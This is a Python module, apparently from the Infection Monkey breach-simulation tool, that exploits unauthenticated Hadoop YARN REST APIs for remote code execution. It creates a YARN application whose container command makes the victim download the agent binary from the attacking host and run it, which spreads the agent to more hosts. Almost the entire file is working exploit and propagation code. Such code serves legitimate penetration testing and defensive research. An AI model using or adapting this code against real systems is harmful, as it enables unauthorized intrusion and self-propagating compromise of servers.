"""
    Remote code execution on HADOOP server with YARN and default settings
    Implementation is based on code from
    https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn
"""

import json
import logging
import posixpath
import string
from time import time

import requests

from common import OperatingSystem
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.utils.code_utils import insecure_generate_random_string
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.web_rce import WebRCE
from infection_monkey.model import (
    HADOOP_LINUX_COMMAND,
    HADOOP_WINDOWS_COMMAND,
    ID_STRING,
    MONKEY_ARG,
)
from infection_monkey.utils.commands import build_monkey_commandline

logger = logging.getLogger(__name__)

HADOOP_EXPLOITER_TAG = "hadoop-exploiter"


class HadoopExploiter(WebRCE):
    _EXPLOITED_SERVICE = "Hadoop"
    HADOOP_PORTS = [("8088", False)]
    # How long we have our http server open for downloads in seconds
    DOWNLOAD_TIMEOUT = 60
    # Random string's length that's used for creating unique app name
    RAN_STR_LEN = 6

    _EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)

    _PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)

    def __init__(self):
        super(HadoopExploiter, self).__init__()

    def _exploit_host(self):
        # Try to get potential urls
        potential_urls = self.build_potential_urls(str(self.host.ip), self.HADOOP_PORTS)
        if not potential_urls:
            self.exploit_result.error_message = (
                f"No potential exploitable urls has been found for {self.host}"
            )
            return self.exploit_result

        monkey_path_on_victim = get_agent_dst_path(self.host)

        http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, self.agent_binary_repository
        )

        command = self._build_command(monkey_path_on_victim, http_path)
        try:
            for url in potential_urls:
                if self.exploit(url, command):
                    self.add_executed_cmd(command)
                    self.exploit_result.exploitation_success = True
                    self.exploit_result.propagation_success = True
                    break
        finally:
            if self.exploit_result.exploitation_success:
                http_thread.join(self.DOWNLOAD_TIMEOUT)
            http_thread.stop()

        return self.exploit_result

    def exploit(self, url: str, command: str):
        if self._is_interrupted():
            return False

        try:
            # Get the newly created application id
            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
                timeout=LONG_REQUEST_TIMEOUT,
            )
            resp_dict = json.loads(resp.content)
            app_id = resp_dict["application-id"]

            # Create a random name for our application in YARN
            # Avoid the risk of blocking by using insecure_generate_random_string()
            rand_name = ID_STRING + insecure_generate_random_string(
                n=self.RAN_STR_LEN, character_set=string.ascii_lowercase
            )
            payload = self._build_payload(app_id, rand_name, command)

            if self._is_interrupted():
                return False

            timestamp = time()
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/"),
                json=payload,
                timeout=LONG_REQUEST_TIMEOUT,
            )

            success = resp.status_code == 202
        except requests.ConnectionError:
            success = False

        message = "" if success else f"Failed to exploit via {url}"
        self._publish_exploitation_event(timestamp, success, error_message=message)
        self._publish_propagation_event(timestamp, success, error_message=message)
        return success

    def check_if_exploitable(self, url):
        try:
            resp = requests.post(
                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
                timeout=LONG_REQUEST_TIMEOUT,
            )
        except requests.ConnectionError:
            return False
        return resp.status_code == 200

    def _build_command(self, path, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1)
        if OperatingSystem.WINDOWS == self.host.operating_system:
            base_command = HADOOP_WINDOWS_COMMAND
        else:
            base_command = HADOOP_LINUX_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    @staticmethod
    def _build_payload(app_id, name, command):
        payload = {
            "application-id": app_id,
            "application-name": name,
            "am-container-spec": {
                "commands": {
                    "command": command,
                }
            },
            "application-type": "YARN",
        }
        return payload
